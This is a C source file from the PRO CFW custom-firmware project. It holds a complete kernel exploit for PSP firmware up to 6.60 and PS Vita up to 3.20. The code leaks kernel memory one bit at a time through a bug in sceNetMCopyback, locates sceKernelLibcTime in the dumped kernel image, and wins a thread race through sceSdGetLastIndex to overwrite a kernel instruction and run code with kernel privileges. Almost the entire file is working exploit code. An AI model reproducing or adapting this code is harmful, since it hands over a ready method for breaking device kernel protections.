/*
 * This file is part of PRO CFW.

 * PRO CFW is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * PRO CFW is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with PRO CFW. If not, see <http://www.gnu.org/licenses/ .
 */

#include <sdk.h>
#include <psploadexec.h>
#include <psploadexec_kernel.h>
#include <psputility_modules.h>
#include <psputility_savedata.h>
#include <module2.h>
#include <rebootconfig.h>
#include <systemctrl_se.h>
#include <string.h>
#include "kxploit.h"

/*
 sceSdGetLastIndex Kernel Exploit for PSP up to 6.60 and PS Vita up to 3.20, both PSP and PSX exploits
*/

// Vita 3.20
//#define LIBC_TIME_ADDR 0x8800F71C

// PSP 6.60
//#define LIBC_TIME_ADDR 0x8800F798

// PSP 5.03
//#define LIBC_TIME_ADDR 0x8800F030

#define KRAM_BACKUP_SIZE (128*1024)

UserFunctions* g_tbl;

int (* _sceSdGetLastIndex)(int a1, int a2, int a3) = (void *)NULL;
int (* _sceKernelLibcTime)(u32 a0, u32 a1) = (void*)NULL;

int savedata_open = 0;

volatile u32 packet[256];
volatile int is_exploited;

u32 patch_addr = 0;
u32 patch_inst = 0;

void (*_sceNetMCopyback_1560F143)(uint32_t * a0, uint32_t a1, uint32_t a2, uint32_t a3);

/* Actual code to trigger the kram read vulnerability.
    We can read the value stored at any location in Kram.
*/

int sceNetMCopyback_exploit_helper(uint32_t addr, uint32_t value, uint32_t seed) {
	uint32_t a0[7];
	a0[0] = addr - 12;
	a0[3] = seed + 1; // (int)a0[3] must be < (int)a1
	a0[4] = 0x20000; // a0[4] must be = 0x20000
	a0[6] = seed; // (int)a0[6] must be < (int)a0[3]
	uint32_t a1 = value + seed + 1;
	uint32_t a2 = 0; // a2 must be <= 0
	uint32_t a3 = 1; // a3 must be > 0
	_sceNetMCopyback_1560F143(a0, a1, a2, a3);
	return a0[6] != seed;
}

// input: 4-byte-aligned kernel address to a non-null positive 32-bit integer
// return *addr >= value;
int is_ge_pos(uint32_t addr, uint32_t value) {
	return sceNetMCopyback_exploit_helper(addr, value, 0xFFFFFFFF);
}

// input: 4-byte-aligned kernel address to a non-null negative 32-bit integer
// return *addr <= value;
int is_le_neg(uint32_t addr, uint32_t value) {
	return sceNetMCopyback_exploit_helper(addr, value, 0x80000000);
}

// input: 4-byte-aligned kernel address to a non-null 32-bit integer
// return (int)*addr > 0
int is_positive(uint32_t addr) {
	return is_ge_pos(addr, 1);
}
u32 readKram(u32 addr) {
	unsigned int res = 0;
	int bit_idx = 1;
	if (is_positive(addr)) {
		for (; bit_idx < 32; bit_idx++) {
			unsigned int value = res | (1 << (31 - bit_idx));
			if (is_ge_pos(addr, value))
				res = value;
		}
		return res;
	}
	res = 0x80000000;
	for (; bit_idx < 32; bit_idx++) {
		unsigned int value = res | (1 << (31 - bit_idx));
		if (is_le_neg(addr, value))
			res = value;
	}
	if (res == 0xFFFFFFFF)
		res = 0;
	return res;
}

void dump_kram(u32* dst, u32* src, u32 size) {
    u32 count = 0;
    while (count < size){
        u32 val = readKram((u32)src);
        *dst = val;
        dst++;
        src++;
        count += 4;
    }
}

u32 FindFunctionFromUsermode(const char *library, u32 nid, u32 start_addr, u32 end_addr)
{
    u32 addr = start_addr;
    
    if (addr) {
        u32 maxaddr = end_addr;
        for (; addr < maxaddr; addr += 4) {
            if (strcmp(library, (const char *)addr) == 0) {
                
                u32 libaddr = (addr-start_addr) + 0x88000000;

                while (*(u32*)(addr -= 4) != libaddr) {
                    if (addr <= start_addr){
                        return 0;
                    }
                };

                u32 exports = (u32)(*(u16*)(addr + 10) + *(u8*)(addr + 9));
                u32 jump = exports * 4;

                addr = *(u32*)(addr + 12);
                addr -= 0x88000000;
                addr += start_addr;

                while (exports--) {
                    if (*(u32*)addr == nid){
                        return *(u32*)(addr + jump);
                    }
                    addr += 4;
                }

                return 0;
            }
        }
    }
    return 0;
}

void executeKernel(u32 kernelContentFunction)
{
    _sceKernelLibcTime(0x08800000, kernelContentFunction|0x80000000);
}

void repairInstruction(KernelFunctions* k_tbl){
    _sw(patch_inst, patch_addr); // recover the damage we've done
}

void KernelFunction()
{
    is_exploited = 1;
}

int stubScanner(UserFunctions* tbl){

    g_tbl = tbl;

    // vulnerable functions
    // load some common modules
    g_tbl->UtilityLoadModule(PSP_MODULE_NP_COMMON);
    g_tbl->UtilityLoadModule(PSP_MODULE_NET_COMMON);
    g_tbl->UtilityLoadModule(PSP_MODULE_NET_INET);
	_sceNetMCopyback_1560F143 = tbl->FindImportUserRam("sceNetIfhandle_lib", 0x1560F143);

    g_tbl->p5_open_savedata(PSP_UTILITY_SAVEDATA_AUTOLOAD);
    _sceSdGetLastIndex = (void*)g_tbl->FindImportUserRam("sceChnnlsv", 0xC4C494F8);
    if (_sceSdGetLastIndex == NULL){
        _sceSdGetLastIndex = (void*)g_tbl->FindImportVolatileRam("sceChnnlsv", 0xC4C494F8);
    }

    // the function we need to patch
    _sceKernelLibcTime = (void*)(g_tbl->KernelLibcTime);

    g_tbl->KernelDcacheWritebackAll();

    void* kram_copy = (void*)0x08D40000;
    dump_kram(kram_copy, 0x88000000, KRAM_BACKUP_SIZE);

    u32 libctime_addr = FindFunctionFromUsermode("UtilsForKernel", 0x27CC57F0, (u32)kram_copy, (u32)kram_copy + KRAM_BACKUP_SIZE);
    u32 libctime_offset = libctime_addr - 0x88000000;

    if (!libctime_addr) return 1;

    patch_addr = libctime_addr+4;
    patch_inst = *(u32*)( (u32)kram_copy + libctime_offset + 4 );

    return (
        _sceSdGetLastIndex == NULL ||
        _sceKernelLibcTime == NULL
    );
}

// the threads that will make sceSdGetLastIndex vulnerable
int qwik_thread()
{
    while (is_exploited != 1) {
        packet[9] = patch_addr - 18 - (u32)packet;
        g_tbl->KernelDelayThread(0);
    }

    return 0;
}

int doExploit()
{

    is_exploited = 0;

    // we create the thread and constantly attempt the exploit
    SceUID qwikthread = g_tbl->KernelCreateThread("qwik thread", qwik_thread, 0x11, 0x1000, THREAD_ATTR_USER, NULL);
    g_tbl->KernelStartThread(qwikthread, 0, NULL);

    while (is_exploited != 1) {
        packet[9] = (u32)16;
        _sceSdGetLastIndex((u32)packet, (u32)packet + 0x100, (u32)packet + 0x200);
        g_tbl->KernelDelayThread(0);
        _sceKernelLibcTime(0x08800000, (u32)&KernelFunction | (u32)0x80000000);
        g_tbl->KernelDcacheWritebackAll();
    }

    return 0;
}
